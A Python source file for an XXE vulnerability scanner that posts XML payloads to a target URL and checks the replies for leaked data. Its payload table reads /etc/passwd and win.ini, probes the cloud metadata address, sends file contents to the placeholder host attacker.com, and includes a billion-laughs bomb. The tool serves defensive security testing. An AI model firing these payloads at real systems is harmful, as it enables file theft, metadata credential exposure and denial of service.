# BRS-GPT: AI-Powered Cybersecurity Analysis Tool
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-10-03 01:41:52 MSK
# Status: Created
# Telegram: https://t.me/easyprotech

"""
XXE (XML External Entity) Scanner

Detects XXE vulnerabilities through:
- External entity injection
- File disclosure attempts
- SSRF via XXE
- Billion laughs attacks
- Parameter entity attacks
"""

import asyncio
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
from datetime import datetime

from ..utils.http_client import HttpClient


class XXEScanner:
    """XML External Entity vulnerability scanner."""

    def __init__(self, http_client: HttpClient, settings: Dict[str, Any]):
        """
        Initialize XXE scanner.
        
        Args:
            http_client: HTTP client for requests
            settings: Scanner settings
        """
        self.http_client = http_client
        self.settings = settings
        self.timeout = settings.get('request_timeout', 15)
        
        # XXE test payloads
        self.test_payloads = {
            'basic_file_disclosure': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
            
            'windows_file_disclosure': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
            
            'ssrf_via_xxe': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>''',
            
            'parameter_entity': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'>">
%eval;
%exfiltrate;]>
<root><data>test</data></root>''',
            
            'billion_laughs': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root><data>&lol3;</data></root>''',
            
            'simple_xxe': '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]>
<root><name>&test;</name></root>'''
        }

        # XXE indicators in responses
        self.xxe_indicators = [
            r'root:.*:/bin/',  # /etc/passwd
            r'\[extensions\]',  # win.ini
            r'ami-id',  # AWS metadata
            r'instance-id',
            r'<\?xml',  # XML response
            r'<!ENTITY',  # Entity in response
        ]

    async def scan_target(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Scan target for XXE vulnerabilities.
        
        Args:
            target_url: Target URL to scan
            
        Returns:
            List of discovered XXE vulnerabilities
        """
        vulnerabilities = []
        
        try:
            # Check if endpoint accepts XML
            if not await self._accepts_xml(target_url):
                return vulnerabilities

            # Test different XXE payloads
            for payload_name, payload in self.test_payloads.items():
                vuln = await self._test_payload(target_url, payload_name, payload)
                if vuln:
                    vulnerabilities.append(vuln)

        except Exception:
            pass

        return vulnerabilities

    async def _accepts_xml(self, url: str) -> bool:
        """Check if endpoint accepts XML content."""
        try:
            simple_xml = '<?xml version="1.0"?><root><test>data</test></root>'
            headers = {'Content-Type': 'application/xml'}
            
            response = await self.http_client.post(url, data=simple_xml, headers=headers)
            
            if not response:
                return False

            # Check if server processed XML (no immediate rejection)
            if response.status in [200, 201, 400, 500]:
                return True

            return False

        except Exception:
            return False

    async def _test_payload(self, url: str, payload_name: str, payload: str) -> Optional[Dict[str, Any]]:
        """
        Test a single XXE payload.
        
        Args:
            url: Target URL
            payload_name: Name of payload being tested
            payload: XXE payload content
            
        Returns:
            Vulnerability information if found
        """
        try:
            headers = {'Content-Type': 'application/xml'}
            
            response = await asyncio.wait_for(
                self.http_client.post(url, data=payload, headers=headers),
                timeout=self.timeout
            )
            
            if not response:
                return None

            body = await response.text()
            
            # Check for XXE indicators
            for indicator in self.xxe_indicators:
                if re.search(indicator, body, re.IGNORECASE | re.MULTILINE):
                    return {
                        'type': 'xxe_vulnerability',
                        'severity': self._assess_severity(payload_name, indicator),
                        'confidence': 0.90,
                        'url': url,
                        'payload_type': payload_name,
                        'payload': payload[:200],  # Truncate for readability
                        'method': 'POST',
                        'evidence': self._extract_evidence(body, indicator),
                        'cwe': 'CWE-611',
                        'owasp': 'A05:2021 - Security Misconfiguration',
                        'impact': self._get_impact_description(payload_name),
                        'timestamp': datetime.utcnow().isoformat(),
                        'remediation': {
                            'summary': 'Disable XML external entity processing',
                            'details': [
                                'Disable DTD processing in XML parser',
                                'Disable external entity processing',
                                'Use less complex data formats (JSON instead of XML)',
                                'Validate and sanitize XML input',
                                'Update XML processors to latest versions',
                                'Implement input validation and whitelisting'
                            ]
                        }
                    }

            # Check for DoS (billion laughs)
            if payload_name == 'billion_laughs':
                if response.status == 500 or len(body) > 1000000:
                    return {
                        'type': 'xxe_dos',
                        'severity': 'high',
                        'confidence': 0.75,
                        'url': url,
                        'payload_type': payload_name,
                        'payload': payload[:200],
                        'method': 'POST',
                        'evidence': f'Response size: {len(body)} bytes or server error',
                        'cwe': 'CWE-776',
                        'owasp': 'A05:2021 - Security Misconfiguration',
                        'impact': 'XML bomb/Billion Laughs DoS attack',
                        'timestamp': datetime.utcnow().isoformat(),
                        'remediation': {
                            'summary': 'Implement entity expansion limits',
                            'details': [
                                'Limit entity expansion in XML parser',
                                'Set maximum entity expansion depth',
                                'Disable entity resolution',
                                'Implement request size limits'
                            ]
                        }
                    }

        except asyncio.TimeoutError:
            # Timeout could indicate XXE DoS
            return {
                'type': 'xxe_timeout',
                'severity': 'medium',
                'confidence': 0.60,
                'url': url,
                'payload_type': payload_name,
                'payload': payload[:200],
                'method': 'POST',
                'evidence': 'Request timeout (possible XXE DoS)',
                'cwe': 'CWE-776',
                'owasp': 'A05:2021 - Security Misconfiguration',
                'impact': 'Possible XXE-based Denial of Service',
                'timestamp': datetime.utcnow().isoformat()
            }
        except Exception:
            pass

        return None

    def _assess_severity(self, payload_name: str, indicator: str) -> str:
        """Assess vulnerability severity."""
        if 'passwd' in indicator or 'root:' in indicator:
            return 'critical'
        if 'ssrf' in payload_name or 'ami-id' in indicator:
            return 'critical'
        if 'parameter_entity' in payload_name:
            return 'high'
        if 'billion_laughs' in payload_name:
            return 'high'
        return 'high'

    def _get_impact_description(self, payload_name: str) -> str:
        """Get impact description based on payload type."""
        impacts = {
            'basic_file_disclosure': 'Access to local files on the server',
            'windows_file_disclosure': 'Access to Windows system files',
            'ssrf_via_xxe': 'SSRF through XXE, access to cloud metadata',
            'parameter_entity': 'Data exfiltration through parameter entities',
            'billion_laughs': 'Denial of Service through XML bomb',
            'simple_xxe': 'Basic XXE file disclosure'
        }
        return impacts.get(payload_name, 'XML External Entity vulnerability')

    def _extract_evidence(self, body: str, pattern: str) -> str:
        """Extract XXE evidence from response."""
        match = re.search(pattern, body, re.IGNORECASE | re.MULTILINE)
        if match:
            start = max(0, match.start() - 30)
            end = min(len(body), match.end() + 30)
            return body[start:end]
        return "XXE indicator detected"


__all__ = ['XXEScanner']

